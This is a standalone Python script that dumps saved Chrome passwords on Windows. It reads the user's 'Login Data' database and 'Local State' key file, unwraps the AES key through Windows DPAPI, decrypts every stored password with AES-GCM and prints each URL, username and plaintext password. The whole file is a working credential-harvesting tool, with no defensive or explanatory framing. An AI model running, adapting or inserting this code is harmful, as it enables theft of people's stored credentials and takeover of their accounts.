import sqlite3
import shutil
import json
import os

import base64
from Cryptodome.Cipher import AES
import win32crypt

DATABASE_FILE_NAME = 'chrome_logins.db'


def get_files_path():
    os_username = os.getlogin()
    return (os.path.normpath(f'C:/Users/{os_username}/AppData/Local/Google/Chrome/User Data/Default/Login Data'),
            os.path.normpath(f'C:/Users/{os_username}/AppData/Local/Google/Chrome/User Data/Local State'))


def get_encrypted_key(key_file_location):
    with open(key_file_location, "r") as f:
        file = json.loads(f.read())
        encrypted_key = base64.b64decode(file["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        encrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    return encrypted_key


def copy_chrome_database(file_location):
    if not os.path.exists(DATABASE_FILE_NAME):
        shutil.copy2(file_location, DATABASE_FILE_NAME)


def get_logins(database_name):
    con = sqlite3.connect(database_name)
    cur = con.cursor()

    res = cur.execute('SELECT origin_url, action_url, username_value, password_value FROM logins;')
    return res.fetchall()


def decrypt(ciphertext, encrypted_key):
    initialization_vector = ciphertext[3:15]
    encrypted_passwd = ciphertext[15:-16]

    cipher = AES.new(encrypted_key, AES.MODE_GCM, initialization_vector)

    decrypted_passwd = cipher.decrypt(encrypted_passwd)
    decrypted_passwd = decrypted_passwd.decode()
    return decrypted_passwd


if __name__ == '__main__':
    login_file, key_file = get_files_path()

    secret_key = get_encrypted_key(key_file)
    copy_chrome_database(login_file)

    accounts = get_logins('chrome_logins.db')

    for index, login in enumerate(accounts):
        url = login[1] if not login[1] == "" else login[0]
        username = login[2]
        passwd = decrypt(login[3], secret_key)

        if username and passwd:
            print(f'URL: {url}\nUsername: {username}\nPassword: {passwd}\n')

os.remove(DATABASE_FILE_NAME)
